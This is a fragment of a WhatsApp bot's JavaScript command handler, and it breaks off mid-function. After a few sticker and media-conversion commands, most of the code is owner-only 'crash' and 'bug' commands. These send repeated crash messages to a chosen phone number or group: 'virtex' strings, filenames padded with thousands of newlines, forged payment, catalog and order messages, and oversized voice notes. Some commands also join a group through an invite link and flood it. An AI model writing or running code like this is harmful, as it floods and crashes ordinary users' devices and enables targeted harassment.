case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {
//if (!isPrem) return replyprem(mess.premium)

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
conn.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'tourl':
try {
if (!isMedia) return reply(`Responde a una foto con el comando ${prefix + command}`)
mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
conn.sendMessage(m.chat, {text:mem},{quoted:m})
} catch (err) {
reply(`Responde a una foto con el comando`)
}
break
case 'wasted':
case 'comrade':
case 'horny':
case 'blur':
case 'pixelate':
case 'simpcard':
case 'lolice':
case 'gay':
case 'jail':
try {
//if (!isPrem) return replyprem(mess.premium)
if (!isMedia) return reply(`Responde a una imagen con el comando ${prefix + command}`)

meeh = await conn.downloadAndSaveMediaMessage(quoted)
memh = await uptotelegra(meeh)
gdye = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${memh}`)
conn.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
} catch (err) {
reply(`Responde a una imagen con el comando`)
}
break
case 'tovn':
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Responde a un audio con el comando ${prefix + command}`)
mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
conn.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
break
case 'toaudio':
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Responde a un video con el comando ${prefix + command}`)
mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
conn.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
break
case 'tomp3':
if (/document/.test(mime)) return reply(`Responde a un audio con el comando ${prefix + command}`)
if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Responde a un audio con el comando ${prefix + command}`)
mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
conn.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyauser, mentions:[sender] }, {quoted:m})
break
case 'smeme':
if (!q) return reply(`Responde a una foto con el comando ${prefix + command} *txt*`)
if (isImage) return reply(`Responde a una foto con el comando ${prefix + command} *txt*`)

mee = await conn.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
conn.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
break

case 'toimg': {
if (!/webp/.test(mime)) return reply(`responde a un sticker con el comando *${prefix+command}*`)
let media = await conn.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
conn.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyauser, 
/*contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": `Hai Kak ${pushname}`, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://wa.me/5493865362492',
"sourceUrl": 'https://wa.me/5493865362492'
}}*/
}, { quoted: m })
fs.unlinkSync(ran)
})
}
break
case 'sticker': 
case 's': {
if (!quoted) return reply(`Envia o responde Imagen/Video/Gifs con el comando ${prefix+command}\nDuracion de video 1-9 segundos`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await conn.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply(`Envia o responde Imagen/Video/Gifs con el comando ${prefix+command}\nDuracion de video 1-9 segundos`)
let media = await quoted.download()
let encmedia = await conn.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
reply(`Envia o responde Imagen/Video/Gifs con el comando ${prefix+command}\nDuracion de video 1-9 segundos`)
}
}
break
/*case 'votar':{
if (!args[0]) throw reply(`Ej: txt|txt|txt`)
if (!text.includes('|')) throw  reply (`Separa con *|* \n\nEj : \n*${prefix + command}* my poll |n|txt|txt|txt`)
let name = await conn.getName(m.sender)
let a = []
let b = text.split('|')
for (let c = 1 || 0; c < b.length; c++) {
a.push([b[c]])
			}
			return sendPoll(m.chat, `*Encuesta solicitada por:* ${name}\n\n*Mensaje:* ${text.split('|')[0]}`, a, m)
}
break*/
case 'send':{
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(num,{text:`hai`},{quoted:lep})
await sleep(1000)
}
reply(` Envíe correctamente binarios al número ${q} Como mucho ${jumlah}`)
}
break
case 'crash':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
jumlah = '15'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
"message": {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 64,
"width": 64,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "7774",
"mediaKeyTimestamp": "1657290167",
"isAnimated": false,
}
}
}})
await sleep(1000)
}
reply(`Envíe correctamente binarios al número ${q} Como mucho ${jumlah}`)
}
break
case 'jagoan' : {
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
conn.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: 'Hai Aku Kayla', 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `${wm}${virus}${virtex(prefix)}`,
"body": `${wm}${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `${wm} WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: ppnyauser, 
thumbnail: ppnyauser,
}
}}}}}, { quoted:crsh })
await sleep(1000)
}
break
case 'jagoanneon' : {
if (!itsMeHyzd) return reply(mess.owner)
conn.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `${wm} ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
contextInfo:{
"externalAdReply": {
"title": `${wm}`,
"body": `Masih Bawahan`,
mimetype: 'audio/mpeg', 
caption: `${wm} WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: ppnyauser, 
thumbnail: ppnyauser,
}
}}}}}, { quoted:crsh })
await sleep(1000)
}
break
case 'locgas':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: conn.waUploadToServer })
var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": `${wm} ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `${wm} ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: num, quoted: lep })
conn.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
reply(`Envíe correctamente binarios al número ${q} Como mucho ${jumlah}`)
}
break
case 'teksgas':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.relayMessage(num, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `${wm} ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyauser }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Exito al enviar trabas a ${num} monto ${jumlah}`)
}
break
case 'vngas':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Exito al enviar trabas a ${num} monto ${jumlah}`)
}
break
case 'kongas':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.sendContact(num, owner, lep)
await sleep(1000)
}
reply(`Exito al enviar trabas a ${num} monto ${jumlah}`)
}
break
case 'docgas':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(num, { 
document: ppnyauser, 
fileName: `🔥 ${wm} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyauser, 
fileLength: "999999999", 
mentions:[sender] }, {quoted:lep})
await sleep(1000)
}
reply(`Exito al enviar trabas a ${num} monto ${jumlah}`)
}
break
case 'stickgas':{
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(1000)
}
reply(`Exito al enviar trabas a ${num} monto ${jumlah}`)
}
break
case 'itemgas': {
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `${wm} ${virus}${virtex(prefix)}`, `${wm} ${virus}${virtex(prefix)}`, `${wm} ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Exito al enviar trabas a ${num} monto ${jumlah}`)
}
break
case 'cataloggas': {
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
num = `${q}`+'@s.whatsapp.net'
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `${wm} WhatsApp ${virus} ${virtex(prefix)}`,
"description": `${virus}${virtex(prefix)}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287705048235`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
conn.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
reply(`Exito al enviar trabas a ${num} monto ${jumlah}`)
}
break
case 'kaylog':{
if (!itsMeHyzd) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: conn.waUploadToServer })
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `${wm} WhatsApp ${virus} ${virtex(prefix)}`,
"description": `${virus}${virtex(prefix)}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287705048235`
},
"businessOwnerJid": "6287705048235@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
conn.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'kayloc':{
if (!itsMeHyzd) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: conn.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"name": `${wm} ${virus}${virtex(prefix)}`,
"url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
"caption": `${wm} ${virus}${virtex(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
"mtype": "locationMessage"
}
}), { userJid: m.chat, quoted: lep })
conn.relayMessage(m.chat, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'kaykontak':{
if (!itsMeHyzd) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.sendContact(m.chat, owner, lep)
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'kayitem':{
if (!itsMeHyzd) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `${wm} ${virus}${virtex(prefix)}`, `${wm} ${virus}${virtex(prefix)}`, `${wm} ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'kaystick':{
if (!itsMeHyzd) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, {sticker: ppnyauser},{ quoted: lep })
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'kaydoc':{
if (!itsMeHyzd) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { 
document: ppnyauser, 
fileName: `🔥 ${wm} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
mimetype: `application/txt`, 
jpegThumbnail: ppnyauser, 
fileLength: "999999999", 
mentions:[sender] }, {quoted:gifes})
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'kayvn':{
if (!itsMeHyzd) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(m.chat, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'kayteks':{
if (!itsMeHyzd) return reply(mess.owner)
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
conn.relayMessage(m.chat, {
requestPaymentMessage: { 
Message: { 
extendedTextMessage: { 
text: `${wm} ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
background: ppnyauser }}}}, {quoted:lep})
await sleep(1000)
}
reply(`Envié binarios con exito, monto ${jumlah}`)
}
break
case 'santedpcparah': 
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Contoh ${command} 6281297970769`)
nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
let hdhe = await conn.onWhatsApp(nmn)
if (hdhe.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
santedpc(bygbt, nmn, sleep)
break
case 'santedgcparah': 
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} linkgp`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalido!')
let fhehfhe = args[0].split('https://chat.whatsapp.com/')[1]
let mnm = await conn.groupAcceptInvite(fhehfhe)
santedgc(bygbt, mnm, sleep)
break
case 'santetpc':
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} 5493865362429`)
tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
if (Input == creator) return reply('No puedo enviar binarios a mi creador')
let kgdhwus = await conn.onWhatsApp(tosend)
if (kgdhwus.length == 0) return reply(`Error, el numero no esta verificado en WhatsApp !!!`)
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
conn.sendMessage(tosend, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000)
}
reply(`Sukses`)
break
case 'santetgc':
if (!itsMeHyzd) return reply(mess.owner)
if (!q) return reply(`Ej: ${prefix+command} linkgp`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply('Link Invalido!')
let resultny = args[0].split('https://chat.whatsapp.com/')[1]
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
let tosendgc = await conn.groupAcceptInvite(resultny)
conn.sendMessage(tosendgc, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await sleep(1000)
}
reply(`Listo`)
break
case 'spambugvip':{
if (!itsMeHyzd) return reply(mess.owner)
if (args.length < 1) return reply(`uso: ${prefix+command} numero|monto\nEj: ${prefix+command} 5493865364229|5`)
numt = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
jumlah = q.split('|')[1]
let cekno = await conn.onWhatsApp(numt)
if (cekno.length == 0) return reply(`Error, el numero no esta verificado!!!`)
if (isNaN(jumlah)) return reply(`Tiene que ser un número`)
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6287705048235@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
var pollCreation = generateWAMessageFromContent(from,proto.Message.fromObject({pollCreationMessage: {name: 'HALO DEKK 🥶',options: [{ optionName: 'VOTE YUK' }, { optionName: 'BERANI VOTE GK' }, { optionName: 'VOTE LAH SEMUA' }, { optionName: 'KATANYA WA KEBAL' }, { optionName: 'SALAM CREATOR BOT' }],selectableOptionsCount: 5,},}),{ userJid: from, quoted: lep })
var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: conn.waUploadToServer })
var order = generateWAMessageFromContent(from,proto.Message.fromObject({ orderMessage: { orderId: '594071395007984',orderImage: messa.imageMessage,itemCount: 100000000000,status: 'INQUIRY',surface: 'CATALOG',message: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,jpegThumbnail: ppnyauser,orderTitle: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,sellerJid: '628979185922@s.whatsapp.net',token: 'AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==',totalAmount1000: '500000000000000',totalCurrencyCode: 'IDR',},}),{ userJid: from, quoted: lep })
var audio = generateWAMessageFromContent(from,proto.Message.fromObject({audioMessage: {url: 'https://mmg.whatsapp.net/d/f/AlPQWgY8vHOKMpm7enXU1GE5b688S07qNTs13GkcEPA-.enc',mimetype: 'audio/mpeg',fileSha256: 'jt+KpQE14SJ+ds03fY3x7ECD8S4Cu+ZUw3wjL/j4rh0=',fileLength: '258330',seconds: 16,ptt: false,mediaKey: 'gJzxyYzxv2CNr65xwRcc9Aw3h7mIdWbqCNJwNm4W640=',fileEncSha256: '6ocO8VwUISypFu6o+j/zNosnexZa2+fmBOr8meFzM1E=',directPath: '/v/t62.7114-24/35503890_364470719079037_2946106926845886057_n.enc?ccb=11-4&oh=01_AVzJ67Dyk0F7h6RDO6eyG9xBIbKuC3noBA6x_7uiqxR85A&oe=62EC8118',mediaKeyTimestamp: '1657190832',},}),{ userJid: from, quoted: lep })
var image = generateWAMessageFromContent(from,proto.Message.fromObject({imageMessage: {url: 'https://mmg.whatsapp.net/d/f/AsLMMEjiKbrsWLE8r3gUN35M47mWv7ToM6hOx8bbe3c3.enc',mimetype: 'image/jpeg',caption: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileSha256: 'A97BrNQQ80Z6ENlf2nfkGcvTW+XrW2t26XWDJTXT6dw=',fileLength: '42521',height: 426,width: 640,mediaKey: '6ATS0zqhx869VtGOm3diwMjszFt3jqFm/tM/Ujw2L1s=',fileEncSha256: 'Q9BtND5E4wtxeBLTQYEpMFK1MWtUscsJ7Y7jCogkixI=',directPath: '/v/t62.7118-24/56480083_2120248748157036_7836614530383507665_n.enc?ccb=11-4&oh=01_AVz0urelAted1JzbEyzzaPFeDjfQw7QTsNJIgrqlyk_3kQ&oe=62EEC1C1',mediaKeyTimestamp: '1657286523',jpegThumbnail: messa.imageMessage,},}),{ userJid: from, quoted: lep })
var document = generateWAMessageFromContent(from,proto.Message.fromObject({documentMessage: {url: 'https://mmg.whatsapp.net/d/f/AqxXrAo_Ps-EypsKORCFw5DI1pwgL6QviYZjjZt1cfc9.enc',mimetype: 'application/octet-stream',title: '.dev',fileSha256: '47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=',pageCount: 0,mediaKey: 'EtWT+vaba/Lg3egtpABQamMrA/JAo7T8hSLvJwgHrSg=',fileName: `ৡৢ͜͡𝟒𝟎𝟒-Kayla ⸸⁶⁶⁶_さん ${ngazap(prefix)}`,fileEncSha256: 'dENBk3fbczAtCSQCSld7QgpDTc8qcAKQQs+70YDjWYs=',directPath: '/v/t62.7119-24/25998581_433881065276377_966985398741330442_n.enc?ccb=11-4&oh=01_AVxJQ5tFKItPezPsVcHVcr6wNVNiZKZjbtTqCXShnXb_hQ&oe=62EEDFD5',mediaKeyTimestamp: '1657288637',},}),{ userJid: from, quoted: lep })
